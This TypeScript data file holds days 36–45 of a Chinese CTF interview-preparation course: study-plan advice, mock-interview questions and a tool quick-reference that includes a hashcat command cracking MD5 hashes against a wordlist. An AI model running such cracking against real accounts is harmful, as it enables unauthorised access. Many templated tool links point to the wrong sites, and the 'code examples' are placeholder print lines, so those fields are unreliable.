    expertNotes: [{ author: '新手区全量通关(上)专家', title: '新手区全量通关(上)学习建议', content: 'Misc方向最杂最考验综合能力：1)工具熟练（binwalk/exiftool/Wireshark）2)善于观察细节 3)广泛的知识储备 4)能写自动化分析脚本。Misc题往往是比赛中拉开分数的关键。', url: '' }]
  },
  {
    id: 'interview-ctf-i36', day: 36, title: '新手区全量通关(下)', subtitle: '学习方法·目标·计划',
    objectives: ['回答学习规划面试题'],
    keyPoints: ['学习路线','目标','计划','方法'],
    content: '# CTF学习路线与规划\n\n**Q1: 你如何学习CTF？**\n刷题训练、看题解、写WriteUp、参加比赛、团队交流、开发工具。\n\n**Q2: CTF学习路线？**\n入门：Web基础、Crypto基础、Misc基础。进阶：PWN基础、Reverse基础、Web进阶。高级：PWN高级、Reverse高级、Crypto高级。\n\n**Q3: 你每天花多少时间学习CTF？**\n举例说明：每天1-2小时，周末4-6小时。\n\n**Q4: 你如何保持学习动力？**\n设定目标、参加比赛、获得成就感、团队激励、分享经验。\n\n**Q5: 你有什么学习资源推荐？**\n书籍、网站、博客、视频、工具。\n\n**Q6: 你如何规划学习进度？**\n制定计划、设定目标、定期评估、调整计划。',
    quiz: [q('CTF学习应该先广度还是先深度？',['先深度','先广度','同时进行','看兴趣'],1,'先广度了解各个方向，再深度钻研1-2个方向'),q('CTF学习中如何保持动力？',['刷题','设定目标','参加比赛','以上都是'],3,'设定目标、参加比赛、获得成就感都能保持学习动力')],
    codeExamples: [{ title: '新手区全量通关(下)示例代码', language: 'python', code: '# 新手区全量通关(下) - Day 36\n# CTF misc方向实战\nprint("CTF misc实战")', explanation: '新手区全量通关(下)核心代码示例' }],
    recommendedTools: [
      { name: 'binwalk', description: '新手区全量通关(下)核心工具', url: 'https://github.com', type: 'local' },
      { name: 'Wireshark', description: '新手区全量通关(下)辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'exiftool', description: '新手区全量通关(下)常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '新手区全量通关(下)实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择新手区全量通关(下)相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握新手区全量通关(下)的基本解题方法' }],
    resources: [
      { name: '新手区全量通关(下)学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '新手区全量通关(下)实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '新手区全量通关(下)专家', title: '新手区全量通关(下)学习建议', content: 'Misc方向最杂最考验综合能力：1)工具熟练（binwalk/exiftool/Wireshark）2)善于观察细节 3)广泛的知识储备 4)能写自动化分析脚本。Misc题往往是比赛中拉开分数的关键。', url: '' }]
  },
  {
    id: 'interview-ctf-i37', day: 37, title: 'BUUCTF随机题目(上)', subtitle: 'CTF面试场景',
    objectives: ['应对CTF面试场景'],
    keyPoints: ['场景模拟','面试话术','实际应答'],
    content: '# CTF面试场景\n\n**场景1:"你没有CTF经验怎么办"**\n"虽然我没有参加过正式CTF比赛，但我系统学习了CTF相关知识，包括Web安全、二进制漏洞、密码学等。我在CTFHub等平台刷题，积累了解题经验。"\n\n**场景2:"讲一个你解过的CTF题目"**\n用STAR法则：题目描述、解题思路、遇到的困难、解决方法、结果。\n\n**场景3:"你如何平衡CTF和工作？"**\n"工作之余我会安排时间学习CTF，通常每天1-2小时。CTF学习也能提升我的安全技能，对工作有帮助。"\n\n**场景4:"CTF和渗透测试有什么区别？"**\n"CTF是解题比赛，注重技巧和速度；渗透测试是实战，注重流程和深度。CTF培养的技能可以很好地应用到渗透测试中。"\n\n**场景5:"你为什么想做安全？"**\n"我对网络安全很感兴趣，CTF让我感受到了解决安全问题的成就感。我希望能够保护网络安全，成为一名优秀的安全工程师。"',
    quiz: [],
    codeExamples: [{ title: 'BUUCTF随机题目(上)示例代码', language: 'python', code: '# BUUCTF随机题目(上) - Day 37\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'BUUCTF随机题目(上)核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'BUUCTF随机题目(上)核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'BUUCTF随机题目(上)辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'BUUCTF随机题目(上)常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'BUUCTF随机题目(上)实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择BUUCTF随机题目(上)相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握BUUCTF随机题目(上)的基本解题方法' }],
    resources: [
      { name: 'BUUCTF随机题目(上)学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'BUUCTF随机题目(上)实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'BUUCTF随机题目(上)专家', title: 'BUUCTF随机题目(上)学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'interview-ctf-i38', day: 38, title: 'BUUCTF随机题目(下)', subtitle: '题型速查·工具速查·命令速查',
    objectives: ['CTF知识速查'],
    keyPoints: ['题型速查','工具速查','命令速查'],
    content: '# CTF快速参考\n\n## 题型速查\n\n| 类型 | 常见题目 | 核心技能 |\n|------|----------|----------|\n| Web | SQL注入、XSS、文件上传、反序列化、SSTI、SSRF | 漏洞挖掘、代码审计 |\n| PWN | 栈溢出、格式化字符串、ROP、堆漏洞 | 二进制分析、漏洞利用 |\n| Crypto | RSA、AES、古典密码、哈希 | 密码学、数学 |\n| Reverse | 静态分析、动态调试、反混淆 | 逆向工程、调试 |\n| Misc | 隐写、流量分析、编码、取证 | 工具使用、观察力 |\n\n## 工具速查\n\n| 类型 | 工具 | 用途 |\n|------|------|------|\n| PWN | pwntools | 编写exp |\n| PWN | IDA/Ghidra | 反汇编 |\n| PWN | GDB | 调试 |\n| Crypto | openssl | 加密解密 |\n| Crypto | hashcat | 哈希破解 |\n| Reverse | x64dbg | 动态调试 |\n| Reverse | Frida | 动态插桩 |\n| Misc | Wireshark | 流量分析 |\n| Misc | binwalk | 文件分析 |\n| Misc | exiftool | 元数据 |\n\n## 命令速查\n\n- pwntools：from pwn import *; p = remote(host, port)\n- GDB：gdb ./binary; b *0xaddr; run\n- IDA：F5(伪代码)、Shift+F12(字符串)、X(交叉引用)\n- Wireshark：http.request、tcp.port==80、Follow TCP Stream\n- hashcat：hashcat -m 0 hash.txt rockyou.txt\n- binwalk：binwalk -e file\n- exiftool：exiftool file.jpg\n- base64：echo text | base64; echo encoded | base64 -d',
    quiz: [],
    codeExamples: [{ title: 'BUUCTF随机题目(下)示例代码', language: 'python', code: '# BUUCTF随机题目(下) - Day 38\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'BUUCTF随机题目(下)核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'BUUCTF随机题目(下)核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'BUUCTF随机题目(下)辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'BUUCTF随机题目(下)常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'BUUCTF随机题目(下)实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择BUUCTF随机题目(下)相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握BUUCTF随机题目(下)的基本解题方法' }],
    resources: [
      { name: 'BUUCTF随机题目(下)学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'BUUCTF随机题目(下)实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'BUUCTF随机题目(下)专家', title: 'BUUCTF随机题目(下)学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'interview-ctf-i39', day: 39, title: '全真模拟赛', subtitle: '面试最常问的CTF问题',
    objectives: ['CTF面试速答'],
    keyPoints: ['高频问题','标准答案','追问预判'],
    content: '# CTF面试高频题集\n\n**Q1: 你参加过哪些CTF比赛？**\n回答：比赛名称、时间、成绩、团队角色。\n\n**Q2: CTF中你最擅长什么方向？**\n回答：具体方向、掌握的技能、解决过的典型题目。\n\n**Q3: 讲一个你印象最深的CTF题目？**\n回答：用STAR法则描述解题过程。\n\n**Q4: CTF经历对你的安全能力有什么帮助？**\n回答：技术提升、思维训练、团队协作、问题解决能力。\n\n**Q5: SQL注入有哪些类型？**\n回答：联合查询、布尔盲注、时间盲注、报错注入、堆叠注入。\n\n**Q6: 栈溢出漏洞原理？**\n回答：缓冲区溢出覆盖返回地址，跳转到恶意代码。\n\n**Q7: RSA常见攻击方法？**\n回答：小指数攻击、共模攻击、低加密指数广播攻击、CRT攻击。\n\n**Q8: 反序列化漏洞如何利用？**\n回答：构造恶意对象，触发危险操作。\n\n**Q9: CTF团队如何分工？**\n回答：按方向分工，每人专注1-2个方向。\n\n**Q10: 你如何学习CTF？**\n回答：刷题、看题解、写WriteUp、参加比赛、团队交流。',
    quiz: [],
    codeExamples: [{ title: '全真模拟赛示例代码', language: 'python', code: '# 全真模拟赛 - Day 39\n# CTF interview方向实战\nprint("CTF interview实战")', explanation: '全真模拟赛核心代码示例' }],
    recommendedTools: [
      { name: 'Notion', description: '全真模拟赛核心工具', url: 'https://github.com', type: 'local' },
      { name: 'Anki', description: '全真模拟赛辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: '思维导图', description: '全真模拟赛常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '全真模拟赛实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择全真模拟赛相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握全真模拟赛的基本解题方法' }],
    resources: [
      { name: '全真模拟赛学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '全真模拟赛实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '全真模拟赛专家', title: '全真模拟赛学习建议', content: 'CTF方向面试核心是展示学习能力和热情：1)扎实的技术基础 2)丰富的实战经验 3)清晰的表达能力 4)持续学习的热情。面试前把做过的项目和比赛详细复盘整理，能讲出具体技术细节和收获。', url: '' }]
  },
  {
    id: 'interview-ctf-i40', day: 40, title: '终极复盘与出征', subtitle: 'CTF面试终极自测',
    objectives: ['CTF面试全真模拟'],
    keyPoints: ['20道模拟面试题','独立作答'],
    content: '# 全真模拟面试 — CTF模块\n\n**1.** 你参加过哪些CTF比赛？成绩如何？\n\n**2.** CTF中你最擅长什么方向？掌握了哪些技能？\n\n**3.** 讲一个你印象最深的CTF题目，解题过程是怎样的？\n\n**4.** SQL注入有哪些类型？如何利用时间盲注？\n\n**5.** 栈溢出漏洞原理？如何绕过Canary保护？\n\n**6.** ROP链如何构造？需要哪些条件？\n\n**7.** RSA常见攻击方法？小指数攻击原理？\n\n**8.** 反序列化漏洞如何挖掘和利用？\n\n**9.** SSTI模板注入原理和利用？\n\n**10.** 隐写术有哪些类型？如何检测？\n\n**11.** Wireshark如何分析流量？常用过滤规则？\n\n**12.** CTF团队如何分工？你担任什么角色？\n\n**13.** CTF中遇到不会的题目怎么办？\n\n**14.** 你如何学习CTF？学习路线是什么？\n\n**15.** CTF经历对你的安全能力有什么帮助？\n\n**16.** 你开发过哪些CTF工具？\n\n**17.** 你觉得CTF最难的是什么？如何克服？\n\n**18.** CTF和渗透测试有什么区别？\n\n**19.** 你未来在CTF方面有什么计划？\n\n**20.** 你对CTF新手有什么建议？\n\n---\n\n**自评**：≥16题通透→CTF方向面试稳了；12-15题需加深；<12题需系统学习CTF基础知识。',
    quiz: [],
    codeExamples: [{ title: '终极复盘与出征示例代码', language: 'python', code: '# 终极复盘与出征 - Day 40\n# CTF interview方向实战\nprint("CTF interview实战")', explanation: '终极复盘与出征核心代码示例' }],
    recommendedTools: [
      { name: 'Notion', description: '终极复盘与出征核心工具', url: 'https://github.com', type: 'local' },
      { name: 'Anki', description: '终极复盘与出征辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: '思维导图', description: '终极复盘与出征常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '终极复盘与出征实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择终极复盘与出征相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握终极复盘与出征的基本解题方法' }],
    resources: [
      { name: '终极复盘与出征学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '终极复盘与出征实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '终极复盘与出征专家', title: '终极复盘与出征学习建议', content: 'CTF方向面试核心是展示学习能力和热情：1)扎实的技术基础 2)丰富的实战经验 3)清晰的表达能力 4)持续学习的热情。面试前把做过的项目和比赛详细复盘整理，能讲出具体技术细节和收获。', url: '' }]
  },
  {
    id: 'interview-ctf-i41', day: 41, title: '全真模拟面试（一）', subtitle: '自我介绍·技术问答·场景设计',
    objectives: ['完成一次30分钟全真模拟面试'],
    keyPoints: ['自我介绍','技术问答链式追问','场景设计'],
    content: '# CTF方向 — 全真模拟面试（一）：自我介绍·技术问答·场景设计\n\n## 今日目标\n完成一次30分钟全真模拟面试，重点练习自我介绍和技术问答的开场部分。\n\n## 模拟面试流程\n\n### 第一环节：自我介绍（3分钟）\n\n**模板**：\n面试官好，我是XXX，有X年CTF竞赛经验。我擅长[核心技能1]、[核心技能2]和[核心技能3]。参加过[代表性竞赛]，取得了[量化成果]。\n\n**关键技巧**：控制在3分钟内 | 用数字量化成果 | 与岗位JD对应\n\n### 第二环节：技术问答链式追问（15分钟）\n\n面试官会从你的自我介绍中挑一个技术点深挖，准备应对3-5层追问。\n\n**链式追问示例**（以"Web安全"为例）：\n1. "你说熟悉Web安全，讲一个你挖过的有意思的漏洞？"\n2. "为什么当时选择用这个工具而不是另一个？"\n3. "如果WAF拦截了你的payload，你会怎么绕过？"\n4. "你挖的这个漏洞的根本原因是什么？架构上怎么避免？"\n\n### 第三环节：场景设计题（12分钟）\n\n**典型场景题**："如果你发现一个CTF题目需要组合多个漏洞才能解出，你会怎么分析？"\n\n**回答框架**：\n1. 题目分析 → "首先分析题目描述和输入输出，确定可能的漏洞类型"\n2. 漏洞挖掘 → "逐一尝试常见漏洞，记录每个漏洞的利用情况"\n3. 漏洞组合 → "思考漏洞之间的关联，找到组合利用的方法"\n4. 构造payload → "编写exp，验证漏洞组合是否可行"',
    quiz: [],
    codeExamples: [{ title: '全真模拟面试（一）示例代码', language: 'python', code: '# 全真模拟面试（一） - Day 41\n# CTF interview方向实战\nprint("CTF interview实战")', explanation: '全真模拟面试（一）核心代码示例' }],
    recommendedTools: [
      { name: 'Notion', description: '全真模拟面试（一）核心工具', url: 'https://github.com', type: 'local' },
      { name: 'Anki', description: '全真模拟面试（一）辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: '思维导图', description: '全真模拟面试（一）常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '全真模拟面试（一）实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择全真模拟面试（一）相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握全真模拟面试（一）的基本解题方法' }],
    resources: [
      { name: '全真模拟面试（一）学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '全真模拟面试（一）实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '全真模拟面试（一）专家', title: '全真模拟面试（一）学习建议', content: 'CTF方向面试核心是展示学习能力和热情：1)扎实的技术基础 2)丰富的实战经验 3)清晰的表达能力 4)持续学习的热情。面试前把做过的项目和比赛详细复盘整理，能讲出具体技术细节和收获。', url: '' }]
  },
  {
    id: 'interview-ctf-i42', day: 42, title: '全真模拟面试（二）', subtitle: '项目深挖·技术广度·反向提问',
    objectives: ['完成一次35分钟全真模拟面试'],
    keyPoints: ['项目深挖','技术广度','反向提问','薪资谈判'],
    content: '# CTF方向 — 全真模拟面试（二）：项目深挖·技术广度·反向提问\n\n## 今日目标\n完成一次35分钟全真模拟面试，重点练习项目深挖和技术广度展示。\n\n## 模拟面试流程\n\n### 第一环节：项目深挖（20分钟）\n\n**深挖方式**：从你提到的CTF项目或比赛经历入手，面试官会逐层深入。\n\n**项目深挖示例**：\n1. "你在CTF比赛中负责什么方向？"\n2. "你遇到过最难的题目是什么？怎么解决的？"\n3. "如果重新来一次，你会怎么优化你的解题思路？"\n4. "这个经历对你现在的技术能力有什么影响？"\n\n**应对策略**：\n- 用STAR法则组织回答\n- 量化成果和影响\n- 展示技术深度和思考过程\n\n### 第二环节：技术广度考察（10分钟）\n\n**常见考察方式**：\n- "除了CTF，你还关注哪些安全领域？"\n- "最近安全圈有什么热点？你怎么看？"\n- "你了解最新的安全技术吗？比如AI安全？"\n\n**准备方向**：\n- 关注安全新闻（FreeBuf、先知社区、安全客）\n- 了解前沿技术（AI安全、零信任、云安全）\n- 阅读行业报告\n\n### 第三环节：反向提问（5分钟）\n\n**优质问题示例**：\n- "团队的技术栈和工作流程是怎样的？"\n- "公司在安全领域的中长期规划是什么？"\n- "这个岗位的成长路径和培训机会有哪些？"\n- "团队目前遇到的最大挑战是什么？"',
    quiz: [],
    codeExamples: [{ title: '全真模拟面试（二）示例代码', language: 'python', code: '# 全真模拟面试（二） - Day 42\n# CTF interview方向实战\nprint("CTF interview实战")', explanation: '全真模拟面试（二）核心代码示例' }],
    recommendedTools: [
      { name: 'Notion', description: '全真模拟面试（二）核心工具', url: 'https://github.com', type: 'local' },
      { name: 'Anki', description: '全真模拟面试（二）辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: '思维导图', description: '全真模拟面试（二）常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '全真模拟面试（二）实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择全真模拟面试（二）相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握全真模拟面试（二）的基本解题方法' }],
    resources: [
      { name: '全真模拟面试（二）学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '全真模拟面试（二）实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '全真模拟面试（二）专家', title: '全真模拟面试（二）学习建议', content: 'CTF方向面试核心是展示学习能力和热情：1)扎实的技术基础 2)丰富的实战经验 3)清晰的表达能力 4)持续学习的热情。面试前把做过的项目和比赛详细复盘整理，能讲出具体技术细节和收获。', url: '' }]
  },
  {
    id: 'interview-ctf-i43', day: 43, title: 'CTF面试避坑指南', subtitle: '常见错误·避雷策略·加分项',
    objectives: ['避免面试中的常见错误'],
    keyPoints: ['常见错误','避雷策略','加分项','减分项'],
    content: '# CTF面试避坑指南\n\n## 常见错误\n\n**1. 夸大技术能力**\n- 面试官会逐层深挖，很快露馅\n- 建议：诚实描述，展示学习能力和潜力\n\n**2. 只懂理论不会实操**\n- CTF岗位看重实战能力\n- 建议：准备演示案例，展示解题过程\n\n**3. 不会沟通**\n- 技术好但表达不清\n- 建议：练习表达，用结构化方式回答\n\n**4. 不了解行业动态**\n- 显示对安全领域缺乏热情\n- 建议：关注安全新闻，了解热点技术\n\n**5. 没有准备反向提问**\n- 显示对公司和岗位缺乏兴趣\n- 建议：提前准备3-5个优质问题\n\n## 加分项\n\n**1. GitHub有CTF相关项目**\n- WriteUp仓库\n- 工具开发\n- 开源贡献\n\n**2. 参加过高级别CTF比赛**\n- DEF CON、强网杯等\n- 有成绩证明\n\n**3. 有技术博客**\n- 分享解题经验\n- 展示技术深度\n\n**4. 有安全证书**\n- OSCP、CEH、CISP等\n\n**5. 团队协作经验**\n- 带领团队参加比赛\n- 分享经验给队友',
    quiz: [],
    codeExamples: [{ title: 'CTF面试避坑指南示例代码', language: 'python', code: '# CTF面试避坑指南 - Day 43\n# CTF interview方向实战\nprint("CTF interview实战")', explanation: 'CTF面试避坑指南核心代码示例' }],
    recommendedTools: [
      { name: 'Notion', description: 'CTF面试避坑指南核心工具', url: 'https://github.com', type: 'local' },
      { name: 'Anki', description: 'CTF面试避坑指南辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: '思维导图', description: 'CTF面试避坑指南常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'CTF面试避坑指南实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择CTF面试避坑指南相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握CTF面试避坑指南的基本解题方法' }],
    resources: [
      { name: 'CTF面试避坑指南学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'CTF面试避坑指南实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'CTF面试避坑指南专家', title: 'CTF面试避坑指南学习建议', content: 'CTF方向面试核心是展示学习能力和热情：1)扎实的技术基础 2)丰富的实战经验 3)清晰的表达能力 4)持续学习的热情。面试前把做过的项目和比赛详细复盘整理，能讲出具体技术细节和收获。', url: '' }]
  },
  {
    id: 'interview-ctf-i44', day: 44, title: 'CTF面试冲刺', subtitle: '3天冲刺计划·最后查漏补缺',
    objectives: ['最后冲刺准备'],
    keyPoints: ['冲刺计划','查漏补缺','心态调整'],
    content: '# CTF面试冲刺\n\n## 3天冲刺计划\n\n**Day 1：知识点回顾**\n- Web漏洞：SQL注入、XSS、文件上传、反序列化、SSTI、SSRF\n- PWN：栈溢出、格式化字符串、ROP、堆漏洞\n- Crypto：RSA、AES、古典密码、哈希\n- Reverse：静态分析、动态调试、反混淆\n- Misc：隐写、流量分析、编码、取证\n\n**Day 2：面试题练习**\n- 刷CTF面试题\n- 练习自我介绍\n- 准备项目案例\n- 模拟技术问答\n\n**Day 3：心态调整**\n- 休息好，保持精力\n- 准备面试着装\n- 熟悉面试流程\n- 保持自信\n\n## 查漏补缺\n\n**重点检查**：\n1. SQL注入各种类型的利用方法\n2. 栈溢出漏洞原理和利用\n3. RSA常见攻击方法\n4. 反序列化漏洞利用\n5. 常用CTF工具的使用\n6. 团队协作经验\n7. 项目案例准备\n\n## 心态调整\n\n**面试前**：\n- 深呼吸，放松心态\n- 相信自己的准备\n- 保持积极态度\n\n**面试中**：\n- 保持冷静\n- 认真倾听\n- 清晰表达\n- 展示自信',
    quiz: [],
    codeExamples: [{ title: 'CTF面试冲刺示例代码', language: 'python', code: '# CTF面试冲刺 - Day 44\n# CTF interview方向实战\nprint("CTF interview实战")', explanation: 'CTF面试冲刺核心代码示例' }],
    recommendedTools: [
      { name: 'Notion', description: 'CTF面试冲刺核心工具', url: 'https://github.com', type: 'local' },
      { name: 'Anki', description: 'CTF面试冲刺辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: '思维导图', description: 'CTF面试冲刺常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'CTF面试冲刺实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择CTF面试冲刺相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握CTF面试冲刺的基本解题方法' }],
    resources: [
      { name: 'CTF面试冲刺学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'CTF面试冲刺实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'CTF面试冲刺专家', title: 'CTF面试冲刺学习建议', content: 'CTF方向面试核心是展示学习能力和热情：1)扎实的技术基础 2)丰富的实战经验 3)清晰的表达能力 4)持续学习的热情。面试前把做过的项目和比赛详细复盘整理，能讲出具体技术细节和收获。', url: '' }]
  },
  {
    id: 'interview-ctf-i45', day: 45, title: 'CTF面试总结与展望', subtitle: '总结·评估·规划·行动',
    objectives: ['总结CTF面试准备'],
    keyPoints: ['总结','评估','规划','行动'],
    content: '# CTF面试总结与展望\n\n## 总结\n\n**已完成学习内容**：\n- 26天CTF知识复习\n- 19天面试题目练习\n- 2天场景模拟\n- 2天全真模拟\n- 1天快速参考\n- 1天高频题集\n- 1天避坑指南\n- 1天冲刺准备\n\n## 核心知识点\n\n**Web安全**：SQL注入、XSS、文件上传、反序列化、SSTI、SSRF\n**二进制安全**：栈溢出、格式化字符串、ROP、堆漏洞\n**密码学**：RSA、AES、古典密码、哈希\n**逆向工程**：静态分析、动态调试、反混淆、Frida\n**杂项**：隐写、流量分析、编码、取证\n\n## 评估\n\n**自我评估**：\n- 是否能回答常见CTF面试题？\n- 是否准备好自我介绍和项目案例？\n- 是否了解CTF工具链？\n- 是否有团队协作经验？\n- 是否了解CTF竞赛规则和策略？\n\n## 规划\n\n**短期目标**：\n- 通过CTF方向面试\n- 加入安全团队\n- 继续参加CTF比赛\n\n**长期目标**：\n- 成为CTF领域专家\n- 参加DEF CON等高级别竞赛\n- 分享经验，帮助新手入门\n\n## 行动\n\n**下一步**：\n1. 继续刷题，保持手感\n2. 参加线上CTF比赛\n3. 写博客分享解题经验\n4. 开发CTF工具\n5. 加入CTF团队',
    quiz: [],
    codeExamples: [{ title: 'CTF面试总结与展望示例代码', language: 'python', code: '# CTF面试总结与展望 - Day 45\n# CTF interview方向实战\nprint("CTF interview实战")', explanation: 'CTF面试总结与展望核心代码示例' }],
    recommendedTools: [
      { name: 'Notion', description: 'CTF面试总结与展望核心工具', url: 'https://github.com', type: 'local' },
      { name: 'Anki', description: 'CTF面试总结与展望辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: '思维导图', description: 'CTF面试总结与展望常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'CTF面试总结与展望实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择CTF面试总结与展望相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握CTF面试总结与展望的基本解题方法' }],
    resources: [
      { name: 'CTF面试总结与展望学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'CTF面试总结与展望实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'CTF面试总结与展望专家', title: 'CTF面试总结与展望学习建议', content: 'CTF方向面试核心是展示学习能力和热情：1)扎实的技术基础 2)丰富的实战经验 3)清晰的表达能力 4)持续学习的热情。面试前把做过的项目和比赛详细复盘整理，能讲出具体技术细节和收获。', url: '' }]
  }
];

export const interviewCtfPlan: CyberLearningPlan = {
  id: 'ctf',
  name: 'CTF竞赛·面试突击',
  subtitle: 'CTF Competition · 45 Days',
  description: '26天CTF全量知识速览（Web/PWN/Crypto/Reverse/Misc）+ 19天面试实战，覆盖CTF竞赛所有核心知识点和面试高频问题，助你在CTF方向面试中脱颖而出。',
  icon: '🏁',
  difficulty: '进阶',
  totalDays: 45,
  color: 'text-purple-400',
  bgColor: 'bg-purple-400/10',
  borderColor: 'border-purple-400/30',
  prerequisites: ['熟悉一种编程语言', '了解基本网络概念', '对CTF有兴趣'],
  certification: 'CTF竞赛面试突击结业证书',
  days: [...reviewDays, ...interviewDays],
  category: 'interview',
  learningPath: ['入门基础','Web安全','PWN进阶','Crypto高级','Reverse实战','Misc技巧','面试冲刺'],
  skills: ['CTF竞赛','Web漏洞','二进制漏洞','密码学','逆向工程','工具开发','团队协作'],
  tags: ['CTF','竞赛','面试','Web安全','PWN','Crypto','Reverse','Misc'],
};
